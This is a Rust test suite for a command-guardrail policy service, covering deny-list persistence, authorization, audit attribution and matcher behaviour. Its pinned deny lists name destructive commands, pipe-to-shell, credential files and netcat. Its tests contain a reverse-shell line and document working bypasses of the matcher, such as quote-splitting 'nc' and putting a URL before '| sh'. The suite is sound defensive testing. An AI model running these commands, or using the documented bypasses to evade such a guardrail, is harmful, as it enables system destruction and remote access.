    fn a_malformed_environment_local_declaration_denies_and_is_never_ignored() {
        let directory = temp();
        let data_dir = dir_of(&directory);

        for malformed in [
            json!({ "deny_commands": "danger" }),
            json!({ "deny_commands": [42] }),
            json!({ "deny_commands": [""] }),
            json!(["danger"]),
            // An environment cannot author its own authority: an unrecognized key is refused
            // rather than ignored, because ignoring an `allow_*` field is how an exemption lands.
            json!({ "allow_commands": ["rm -rf /"] }),
        ] {
            let env = env_with(malformed.clone());
            let decision = decide(data_dir, &env, "echo hi");
            assert!(
                is_indeterminate(&decision),
                "a malformed local declaration must deny, not be ignored: {malformed}"
            );
            assert_eq!(
                refusal_value(&decision)["store"],
                json!("environment_local_declaration")
            );
        }
    }

    #[test]
    fn an_absent_or_null_local_declaration_composes_as_no_additions() {
        let directory = temp();
        let data_dir = dir_of(&directory);

        for env in [no_local_env(), env_with(Value::Null), json!({ "id": "e" })] {
            assert!(matches!(
                decide(data_dir, &env, "echo hi"),
                GuardrailDecision::Allowed
            ));
            assert!(matches!(
                decide(data_dir, &env, "rm -rf /"),
                GuardrailDecision::Denied(_)
            ));
        }
    }

    // -------------------------------------------------------- SOURCE PRECEDENCE

    #[test]
    fn a_valid_legacy_file_is_active_and_visibly_identified_as_the_legacy_store() {
        let directory = temp();
        let data_dir = dir_of(&directory);
        write_legacy(
            &directory,
            br#"{"deny_commands":["only-this"],"deny_executables":[]}"#,
        );

        let (status, body) = guardrail_policy_projection(data_dir);
        assert_eq!(status, StatusCode::OK);
        assert_eq!(body["source"], json!("legacy_operator_file"));
        assert_eq!(body["policy"]["deny_commands"], json!(["only-this"]));
        // Operator-set means operator-set: the default is not layered underneath it.
        assert!(matches!(
            decide(data_dir, &no_local_env(), "rm -rf /"),
            GuardrailDecision::Allowed
        ));
        assert!(matches!(
            decide(data_dir, &no_local_env(), "only-this"),
            GuardrailDecision::Denied(_)
        ));
        // The read path did not rewrite, migrate, or delete the legacy file.
        assert!(directory.path().join(LEGACY_POLICY_FILE).is_file());
        assert!(!directory.path().join(POLICY_FAMILY).exists());
    }

    #[test]
    fn a_durable_record_supersedes_a_legacy_file_without_deleting_it() {
        let directory = temp();
        let data_dir = dir_of(&directory);
        write_legacy(
            &directory,
            br#"{"deny_commands":["legacy-only"],"deny_executables":[]}"#,
        );
        seed_durable(
            data_dir,
            &json!({ "deny_commands": ["durable-only"], "deny_executables": [] }),
        );

        let (status, body) = guardrail_policy_projection(data_dir);
        assert_eq!(status, StatusCode::OK);
        assert_eq!(body["source"], json!("durable_operator_record"));
        assert!(matches!(
            decide(data_dir, &no_local_env(), "durable-only"),
            GuardrailDecision::Denied(_)
        ));
        assert!(matches!(
            decide(data_dir, &no_local_env(), "legacy-only"),
            GuardrailDecision::Allowed
        ));
        assert!(directory.path().join(LEGACY_POLICY_FILE).is_file());
    }

    // ------------------------------------------------------- 5. AUTHORIZE FIRST

    #[test]
    fn an_unauthenticated_mutation_changes_no_policy_and_no_audit_state() {
        let directory = temp();
        let data_dir = dir_of(&directory);
        write_legacy(
            &directory,
            br#"{"deny_commands":["operator-set"],"deny_executables":[]}"#,
        );
        let before = std::fs::read(directory.path().join(LEGACY_POLICY_FILE)).unwrap();

        let (status, body) = set_global_guardrail_policy(
            data_dir,
            &HeaderMap::new(),
            br#"{"deny_commands":["attacker-installed"]}"#,
        );

        assert_eq!(status, StatusCode::UNAUTHORIZED);
        assert_eq!(body["ok"], json!(false));
        assert_eq!(body["code"], json!("hypervisor.authentication_required"));
        // The policy plane is byte-identical afterwards.
        assert_eq!(
            std::fs::read(directory.path().join(LEGACY_POLICY_FILE)).unwrap(),
            before
        );
        assert!(!directory.path().join(POLICY_FAMILY).exists());
        assert!(audit_records(data_dir).is_empty());
        // ...and the operator's policy is still the one deciding commands.
        assert!(matches!(
            decide(data_dir, &no_local_env(), "operator-set"),
            GuardrailDecision::Denied(_)
        ));
        assert!(matches!(
            decide(data_dir, &no_local_env(), "attacker-installed"),
            GuardrailDecision::Allowed
        ));
    }

    /// AUTHORIZE BEFORE DESERIALIZATION, proven by ordering rather than asserted in prose: a body
    /// that is not even valid JSON still returns 401, so nothing deserialized it.
    #[test]
    fn authorization_refuses_before_the_body_is_deserialized() {
        let directory = temp();
        let data_dir = dir_of(&directory);

        let (status, body) =
            set_global_guardrail_policy(data_dir, &HeaderMap::new(), b"{ not json at all");

        assert_eq!(status, StatusCode::UNAUTHORIZED);
        assert_ne!(
            body["error"]["code"],
            json!("guardrail_policy_request_malformed")
        );
        assert!(audit_records(data_dir).is_empty());
    }

    // ------------------------------------------------------- REQUEST VALIDATION

    #[test]
    fn a_malformed_request_is_a_typed_400_before_any_write_or_audit() {
        let directory = temp();
        let data_dir = dir_of(&directory);

        for (body, code) in [
            (
                r#"{ not json"#.to_string(),
                "guardrail_policy_request_malformed",
            ),
            (
                r#"["deny_commands"]"#.to_string(),
                "guardrail_policy_request_malformed",
            ),
            (
                r#"{"deny_commands":"nope"}"#.to_string(),
                "guardrail_policy_request_malformed",
            ),
            (
                r#"{"deny_commands":[7]}"#.to_string(),
                "guardrail_policy_request_malformed",
            ),
            (
                r#"{"deny_commands":["  "]}"#.to_string(),
                "guardrail_policy_request_malformed",
            ),
            // An authority-carrying extra is refused rather than persisted. The principal is
            // resolved server-side and can never be supplied by the request.
            (
                r#"{"deny_commands":[],"deny_executables":[],"authorized_by":"me"}"#.to_string(),
                "guardrail_policy_request_closed",
            ),
            (
                r#"{"deny_commands":[],"deny_executables":[],"changed_by_principal_ref":"principal://attacker"}"#.to_string(),
                "guardrail_policy_request_closed",
            ),
            // A policy write is a FULL REPLACEMENT: a partial submission is refused, never
            // completed from the built-in default.
            (
                r#"{"deny_executables":["socat"]}"#.to_string(),
                "guardrail_policy_request_incomplete",
            ),
            (
                r#"{"deny_commands":["only-this"]}"#.to_string(),
                "guardrail_policy_request_incomplete",
            ),
            (r#"{}"#.to_string(), "guardrail_policy_request_incomplete"),
        ] {
            let (status, payload) =
                apply_authorized_policy_mutation(data_dir, ACTOR, body.as_bytes());
            assert_eq!(status, StatusCode::BAD_REQUEST, "for body {body}");
            assert_eq!(payload["error"]["code"], json!(code), "for body {body}");
        }
        assert!(!directory.path().join(POLICY_FAMILY).exists());
        assert!(audit_records(data_dir).is_empty());
    }

    /// THE SILENT-LOSS PATH THAT IS NOW CLOSED. Filling an omitted key from the built-in default
    /// meant an operator holding custom `deny_commands` who submitted only `deny_executables`
    /// had their command denials durably REPLACED by the built-in list — and this contract's own
    /// indeterminacy recovery text tells operators to POST a policy, so the destructive path was
    /// reachable from its own advice. PO-10: the default does not silently re-add itself
    /// underneath an authorized change.
    #[test]
    fn a_partial_submission_is_refused_and_destroys_no_existing_operator_denials() {
        let directory = temp();
        let data_dir = dir_of(&directory);
        seed_durable(
            data_dir,
            &json!({
                "deny_commands": ["operator-authored-denial"],
                "deny_executables": ["operator-authored-executable"]
            }),
        );

        let (status, payload) =
            apply_authorized_policy_mutation(data_dir, ACTOR, br#"{"deny_executables":["socat"]}"#);

        assert_eq!(status, StatusCode::BAD_REQUEST);
        assert_eq!(
            payload["error"]["code"],
            json!("guardrail_policy_request_incomplete")
        );
        assert!(payload["error"]["message"]
            .as_str()
            .unwrap()
            .contains("FULL REPLACEMENT"));
        // The operator's custom denials are untouched — the whole point.
        let durable = durable_fs::read_record_durable(data_dir, POLICY_FAMILY, POLICY_RECORD)
            .unwrap()
            .unwrap();
        assert_eq!(
            durable["deny_commands"],
            json!(["operator-authored-denial"])
        );
        assert_eq!(
            durable["deny_executables"],
            json!(["operator-authored-executable"])
        );
        // ...and still enforcing, while the built-in default was not re-added underneath them.
        assert!(matches!(
            decide(data_dir, &no_local_env(), "operator-authored-denial"),
            GuardrailDecision::Denied(_)
        ));
        assert!(matches!(
            decide(data_dir, &no_local_env(), "rm -rf /"),
            GuardrailDecision::Allowed
        ));
        assert!(audit_records(data_dir).is_empty());
    }

    // ---------------------------------------------------- 6. PERSISTENCE REFUSALS

    #[test]
    fn a_not_committed_write_returns_no_success_and_writes_no_audit() {
        let directory = temp();
        let data_dir = dir_of(&directory);
        // A regular FILE where the durable family directory belongs: `create_dir_all` errors, so
        // nothing is ever staged or renamed.
        std::fs::write(directory.path().join(POLICY_FAMILY), b"not a directory").unwrap();

        let (status, body) = apply_authorized_policy_mutation(
            data_dir,
            ACTOR,
            br#"{"deny_commands":["candidate"],"deny_executables":[]}"#,
        );

        assert_eq!(status, StatusCode::INTERNAL_SERVER_ERROR);
        assert_eq!(body["ok"], json!(false));
        assert_eq!(
            body["error"]["code"],
            json!("guardrail_policy_persistence_failed")
        );
        // No audit of an unapplied candidate.
        assert!(audit_records(data_dir).is_empty());
        // The candidate is not enforcing, and a broken durable store is reported as INDETERMINATE
        // rather than resolved to the default.
        assert_eq!(
            body["active_policy"]["error"]["code"],
            json!("guardrail_policy_indeterminate")
        );
        assert!(is_indeterminate(&decide(data_dir, &no_local_env(), "ls")));
    }

    /// The refusal reports a FRESH read and says so — it never claims the state this request read
    /// a moment earlier survived a concurrent writer.
    #[test]
    fn a_not_committed_refusal_reports_a_fresh_read_and_disclaims_prior_state() {
        let directory = temp();
        let data_dir = dir_of(&directory);
        write_legacy(
            &directory,
            br#"{"deny_commands":["still-active"],"deny_executables":[]}"#,
        );

        let (status, body) = refusal_for_persist_failure(
            data_dir,
            &PersistFailure::NotCommitted(std::io::Error::other("synthetic")),
        );

        assert_eq!(status, StatusCode::INTERNAL_SERVER_ERROR);
        assert_eq!(
            body["error"]["code"],
            json!("guardrail_policy_persistence_failed")
        );
        assert_eq!(
            body["active_policy"]["source"],
            json!("legacy_operator_file")
        );
        assert!(body["active_policy"]["read"]
            .as_str()
            .unwrap()
            .contains("not a claim"));
        // A failed mutation may not truncate, empty, or partially overwrite what it failed to
        // replace.
        assert_eq!(
            body["active_policy"]["policy"]["deny_commands"],
            json!(["still-active"])
        );
        assert!(audit_records(data_dir).is_empty());
    }

    /// The `RenamedDurabilityUnconfirmed` MAPPING. Its only injection point in `durable_fs` is a
    /// process-global env var, so the variant is constructed here and the handler's disposition
    /// asserted; durable_fs's own tests own the syscall behaviour that produces it.
    #[test]
    fn a_durability_unconfirmed_write_is_ambiguous_and_claims_neither_policy() {
        let directory = temp();
        let data_dir = dir_of(&directory);

        let (status, body) = refusal_for_persist_failure(
            data_dir,
            &PersistFailure::RenamedDurabilityUnconfirmed(std::io::Error::other("synthetic")),
        );

        assert_eq!(status, StatusCode::SERVICE_UNAVAILABLE);
        assert_eq!(body["ok"], json!(false));
        assert_eq!(
            body["error"]["code"],
            json!("guardrail_policy_durability_unconfirmed")
        );
        let message = body["error"]["message"].as_str().unwrap();
        assert!(
            message.contains("NOT an atomic failure"),
            "must not present as an atomic failure: {message}"
        );
        assert!(
            message.contains("NOT a claim that any prior policy is still active"),
            "must not claim the prior policy survived: {message}"
        );
        // No audit-as-fact for an unconfirmed candidate.
        assert!(audit_records(data_dir).is_empty());
    }

    #[test]
    fn a_reload_that_disagrees_with_the_candidate_is_not_acknowledged_and_not_audited() {
        let directory = temp();
        let data_dir = dir_of(&directory);
        // What a concurrent writer produces: the write committed, but the durable store holds a
        // DIFFERENT policy by the time it is re-read.
        seed_durable(
            data_dir,
            &json!({ "deny_commands": ["written-by-someone-else"], "deny_executables": [] }),
        );

        let (status, body) = acknowledge_policy_from_reload(
            data_dir,
            ACTOR,
            &json!({ "deny_commands": ["this-requests-candidate"], "deny_executables": [] }),
        );

        assert_eq!(status, StatusCode::SERVICE_UNAVAILABLE);
        assert_eq!(body["ok"], json!(false));
        assert_eq!(
            body["error"]["code"],
            json!("guardrail_policy_reload_disagreed")
        );
        // The submitted candidate is never the acknowledged policy.
        assert!(body.get("policy").is_none());
        assert!(audit_records(data_dir).is_empty());
    }

    /// THE ATTRIBUTION HOLE denial-list equality left open: two concurrent writers submitting
    /// EQUIVALENT policies. Under a denial-keys-only comparison this request would acknowledge —
    /// and audit under ITS principal — a record the other writer committed. The reloaded record
    /// must be the exact record this request built, so the differing server-generated
    /// `updated_at` is a disagreement even though every denial is identical.
    #[test]
    fn an_equivalent_policy_written_by_another_writer_is_not_acknowledged_as_this_request() {
        let directory = temp();
        let data_dir = dir_of(&directory);
        let denials = json!({ "deny_commands": ["same-denial"], "deny_executables": ["same-exe"] });
        // The other writer's record: byte-identical denial lists, different record identity.
        let mut theirs = denials.clone();
        theirs["updated_at"] = json!("2026-08-08T07:00:00Z");
        seed_durable(data_dir, &theirs);
        // This request's candidate: same denials, its own timestamp.
        let mut ours = denials.clone();
        ours["updated_at"] = json!("2026-08-08T07:00:01Z");

        let (status, body) = acknowledge_policy_from_reload(data_dir, ACTOR, &ours);

        assert_eq!(status, StatusCode::SERVICE_UNAVAILABLE);
        assert_eq!(
            body["error"]["code"],
            json!("guardrail_policy_reload_disagreed")
        );
        assert!(body["error"]["message"]
            .as_str()
            .unwrap()
            .contains("attribute another writer's policy to this caller"));
        assert!(body.get("policy").is_none());
        // The decisive assertion: no audit record claims this actor authored the other writer's
        // policy. A denial-keys-only comparison would have written exactly that.
        assert!(
            audit_records(data_dir).is_empty(),
            "another writer's record must not be audited under this request's principal"
        );
        // The other writer's record is untouched and still enforcing.
        let durable = durable_fs::read_record_durable(data_dir, POLICY_FAMILY, POLICY_RECORD)
            .unwrap()
            .unwrap();
        assert_eq!(durable["updated_at"], json!("2026-08-08T07:00:00Z"));
    }

    #[test]
    fn a_reload_that_cannot_project_is_ambiguous_and_not_audited() {
        let directory = temp();
        let data_dir = dir_of(&directory);
        std::fs::write(directory.path().join(POLICY_FAMILY), b"not a directory").unwrap();

        let (status, body) = acknowledge_policy_from_reload(
            data_dir,
            ACTOR,
            &json!({ "deny_commands": [], "deny_executables": [] }),
        );

        assert_eq!(status, StatusCode::SERVICE_UNAVAILABLE);
        assert_eq!(
            body["error"]["code"],
            json!("guardrail_policy_reload_indeterminate")
        );
        assert!(audit_records(data_dir).is_empty());
    }

    // ----------------------------------------------------------- 7. DURABLE SUCCESS

    #[test]
    fn a_durable_write_is_acknowledged_from_the_exact_reloaded_policy() {
        let directory = temp();
        let data_dir = dir_of(&directory);
        write_legacy(
            &directory,
            br#"{"deny_commands":["superseded"],"deny_executables":[]}"#,
        );

        let (status, body) = apply_authorized_policy_mutation(
            data_dir,
            ACTOR,
            br#"{"deny_commands":["operator-chosen"],"deny_executables":["socat"]}"#,
        );

        assert_eq!(status, StatusCode::OK);
        assert_eq!(body["ok"], json!(true));
        assert_eq!(body["source"], json!("durable_operator_record"));
        assert_eq!(body["audited"], json!(true));
        assert_eq!(body["audit_durability"]["state"], json!("durable"));
        assert_eq!(body["policy"]["deny_commands"], json!(["operator-chosen"]));
        assert_eq!(body["policy"]["deny_executables"], json!(["socat"]));
        // The acknowledgement came from disk, so a later independent read agrees exactly.
        let (_, reread) = guardrail_policy_projection(data_dir);
        assert_eq!(reread["policy"], body["policy"]);
        assert_eq!(reread["source"], json!("durable_operator_record"));
        // The new policy is the one enforcing, and the superseded legacy one is not.
        assert!(matches!(
            decide(data_dir, &no_local_env(), "operator-chosen"),
            GuardrailDecision::Denied(_)
        ));
        assert!(matches!(
            decide(data_dir, &no_local_env(), "superseded"),
            GuardrailDecision::Allowed
        ));
        // Exactly one policy-change audit record, and it carries the reloaded policy.
        let audits = audit_records(data_dir);
        assert_eq!(audits.len(), 1);
        assert_eq!(audits[0]["kind"], json!("policy_changed"));
        assert_eq!(
            audits[0]["policy"]["deny_commands"],
            json!(["operator-chosen"])
        );
        // ...and it NAMES the principal the authority crossing resolved. A truth_mutation audit
        // that cannot answer "who" is weak evidence for a plane whose whole point is the
        // authority crossing.
        assert_eq!(audits[0]["changed_by_principal_ref"], json!(ACTOR));
    }

    /// The audited principal is SERVER-RESOLVED and cannot be supplied by the request: the
    /// attribution field is a closed extra, so a body carrying it is refused outright rather than
    /// overriding who the crossing resolved.
    #[test]
    fn the_audited_principal_is_server_resolved_and_never_request_carried() {
        let directory = temp();
        let data_dir = dir_of(&directory);

        let (status, payload) = apply_authorized_policy_mutation(
            data_dir,
            ACTOR,
            br#"{"deny_commands":[],"deny_executables":[],"changed_by_principal_ref":"principal://someone-else"}"#,
        );
        assert_eq!(status, StatusCode::BAD_REQUEST);
        assert_eq!(
            payload["error"]["code"],
            json!("guardrail_policy_request_closed")
        );
        assert!(audit_records(data_dir).is_empty());

        // The same policy without the field is admitted, and the audit names the RESOLVED actor.
        let (status, _) = apply_authorized_policy_mutation(
            data_dir,
            ACTOR,
            br#"{"deny_commands":[],"deny_executables":[]}"#,
        );
        assert_eq!(status, StatusCode::OK);
        let audits = audit_records(data_dir);
        assert_eq!(audits.len(), 1);
        assert_eq!(audits[0]["changed_by_principal_ref"], json!(ACTOR));
        assert_ne!(
            audits[0]["changed_by_principal_ref"],
            json!("principal://someone-else")
        );
    }

    // ------------------------------------------- 8. AUDIT GAP ON AN ACTIVE POLICY

    /// The other inversion canon demands: once the policy is durable it is ENFORCING, so
    /// reporting the mutation as failed would invite a retry of an already-applied change.
    #[test]
    fn an_audit_failure_after_reload_reports_the_policy_active_and_unaudited() {
        let directory = temp();
        let data_dir = dir_of(&directory);
        // A regular FILE where the audit family directory belongs. The POLICY write is untouched
        // by this shadow — different family, different directory — so the policy commits and the
        // audit alone fails. Deterministic, uid-independent, process-local.
        std::fs::write(
            directory.path().join("operability-audit"),
            b"not a directory",
        )
        .unwrap();

        let (status, body) = apply_authorized_policy_mutation(
            data_dir,
            ACTOR,
            br#"{"deny_commands":["active-anyway"],"deny_executables":[]}"#,
        );

        // NOT an atomic failure, and NOT a rollback.
        assert_eq!(status, StatusCode::OK);
        assert_eq!(body["ok"], json!(true));
        assert_eq!(body["policy"]["deny_commands"], json!(["active-anyway"]));
        // Never `audited: true` over a failed write.
        assert_eq!(body["audited"], json!(false));
        assert_eq!(body["audit_durability"]["state"], json!("not_committed"));
        assert!(!body["audit_durability"]["recovery"]
            .as_str()
            .unwrap()
            .is_empty());
        // The enforcement consequence, not merely the response shape: the policy really is the
        // one deciding commands.
        assert!(matches!(
            decide(data_dir, &no_local_env(), "active-anyway"),
            GuardrailDecision::Denied(_)
        ));
        assert!(matches!(
            decide(data_dir, &no_local_env(), "rm -rf /"),
            GuardrailDecision::Allowed
        ));
    }

    /// BOTH audit failure arms, exercised through the extracted production mapping. The mapping
    /// is shared by the policy-change and enforced-denial paths, so this covers both callers.
    /// `RenamedDurabilityUnconfirmed` has no uid-independent syscall injection — its only seam in
    /// durable_fs is a process-global env var — so the variant is CONSTRUCTED and the real
    /// mapping function is what runs.
    #[test]
    fn neither_audit_failure_arm_can_report_audited() {
        let durable = audit_durability("pca_1", "the fact happened", Ok(()));
        assert_eq!(durable["audited"], json!(true));
        assert_eq!(durable["state"], json!("durable"));
        assert_eq!(durable["audit_id"], json!("pca_1"));

        let not_committed = audit_durability(
            "pca_2",
            "the fact happened",
            Err(PersistFailure::NotCommitted(std::io::Error::other(
                "synthetic",
            ))),
        );
        assert_eq!(not_committed["audited"], json!(false));
        assert_eq!(not_committed["state"], json!("not_committed"));
        assert!(not_committed["message"]
            .as_str()
            .unwrap()
            .contains("the evidence is lost, the fact is not"));
        assert!(not_committed["recovery"]
            .as_str()
            .unwrap()
            .contains("OBSERVABILITY loss only"));

        let unconfirmed = audit_durability(
            "pca_3",
            "the fact happened",
            Err(PersistFailure::RenamedDurabilityUnconfirmed(
                std::io::Error::other("synthetic"),
            )),
        );
        assert_eq!(unconfirmed["audited"], json!(false));
        assert_eq!(unconfirmed["state"], json!("durability_unconfirmed"));
        assert!(unconfirmed["message"]
            .as_str()
            .unwrap()
            .contains("UNCONFIRMED durability"));
        assert!(unconfirmed["recovery"]
            .as_str()
            .unwrap()
            .contains("The enforced fact is unaffected"));
    }

    /// ...and the live wiring, driven through a real path-shadow fault, so the mapping above is
    /// proven to be the one the production write actually reaches.
    #[test]
    fn a_failed_denial_audit_write_reports_not_committed() {
        let directory = temp();
        let data_dir = dir_of(&directory);
        std::fs::write(
            directory.path().join("operability-audit"),
            b"not a directory",
        )
        .unwrap();

        let audit = audit_guardrail_denial(data_dir, "env_1", "rm -rf /", &json!({}));

        assert_eq!(audit["audited"], json!(false));
        assert_eq!(audit["state"], json!("not_committed"));
    }

    // ---------------------------------------- 9. THE MATCHER TABLE AND ITS LIMITS

    #[test]
    fn default_matcher_table_is_pinned() {
        // The exact shipped enforcement table, in order. The packet that produced this test said
        // "14-command"; the table on master carries FIFTEEN command patterns, and the extra one
        // is pinned rather than dropped — removing an entry to match a miscount would WIDEN the
        // deny-list.
        assert_eq!(
            DEFAULT_DENY_COMMANDS,
            [
                "rm -rf /",
                "rm -rf /*",
                "rm -rf ~",
                ":(){",
                "mkfs",
                "dd if=",
                "> /dev/sd",
                "chmod -R 777 /",
                "shutdown",
                "reboot",
                "curl | sh",
                "wget | sh",
                "| sh -",
                "/etc/shadow",
                "/etc/passwd",
            ]
        );
        assert_eq!(DEFAULT_DENY_EXECUTABLES, ["nc", "ncat", "nmap", "telnet"]);
        assert_eq!(
            default_policy()["deny_commands"],
            json!(DEFAULT_DENY_COMMANDS)
        );
        assert_eq!(
            default_policy()["deny_executables"],
            json!(DEFAULT_DENY_EXECUTABLES)
        );
    }

    /// The matcher's KNOWN LIMITS, pinned as behaviour so a later change to them is a deliberate
    /// act rather than a side effect. Every assertion below is a documented current limit, NOT an
    /// endorsement: each `Allowed` here is a real bypass this packet did not close.
    #[test]
    fn preserved_matcher_limits_are_pinned_not_silently_changed() {
        let directory = temp();
        let data_dir = dir_of(&directory);
        let env = no_local_env();
        let denied = |command: &str| {
            matches!(
                decide(data_dir, &env, command),
                GuardrailDecision::Denied(_)
            )
        };

        // Whitespace RUNS are collapsed, so spacing variants of a pattern still match...
        assert!(denied("rm    -rf   /"));
        // ...but the match is a plain SUBSTRING test on the normalized string, so the shipped
        // `curl | sh` pattern only fires when `curl` and `| sh` are literally adjacent.
        assert!(denied("curl | sh"));
        assert!(denied("curl   |   sh"));
        // The two limits that matter in practice, pinned as the REAL behaviour rather than the
        // behaviour one would hope for. Both are live bypasses of the shipped pattern and
        // NEITHER is closed here: the realistic pipe-to-shell invocation carries a URL between
        // the two halves, and the unspaced form has no whitespace to collapse around the pipe.
        assert!(!denied("curl https://x | sh"));
        assert!(!denied("curl https://x|sh"));
        // The separate `| sh -` pattern does catch the URL-bearing form when the shell is invoked
        // with a trailing `-`, which is one reason dropping any entry would widen the list.
        assert!(denied("curl https://x | sh -"));

        // Command patterns match CASE-INSENSITIVELY.
        assert!(denied("RM -RF /"));
        // Executable matching is CASE-SENSITIVE against the token basename.
        assert!(denied("nc -e /bin/sh 10.0.0.1 4444"));
        assert!(!denied("NC -e /bin/sh 10.0.0.1 4444"));
        // Basename matching survives a path, and wrapping a denied COMMAND in `bash -c` does not
        // smuggle it past, because that is still this command string.
        assert!(denied("/usr/bin/nc -l"));
        assert!(denied("bash -c \"rm -rf /\""));
        assert!(denied("bash -c \"nc -l\""));

        // QUOTE-SPLITTING an executable name DOES smuggle it past. The tokenizer splits on `\"`
        // and `'`, so `n\"c\"` becomes the tokens `n` and `c`, neither of which is a denied
        // basename — while the shell still runs `nc`. An earlier version of the matcher's doc
        // comment claimed quoting could not do this; it was false. Pinned, not fixed: closing it
        // is a matcher change, not a persistence change.
        assert!(!denied("n\"c\" -e /bin/sh 10.0.0.1 4444"));
        assert!(!denied("n'c' -e /bin/sh 10.0.0.1 4444"));
    }

    #[test]
    fn passing_the_deny_test_reports_allowed_and_nothing_more() {
        let directory = temp();
        let data_dir = dir_of(&directory);
        // A guardrail is a deny instrument: `Allowed` carries no grant, lease, or authority
        // payload for a caller to mistake for permission.
        assert!(matches!(
            decide(data_dir, &no_local_env(), "cargo test"),
            GuardrailDecision::Allowed
        ));
    }
}
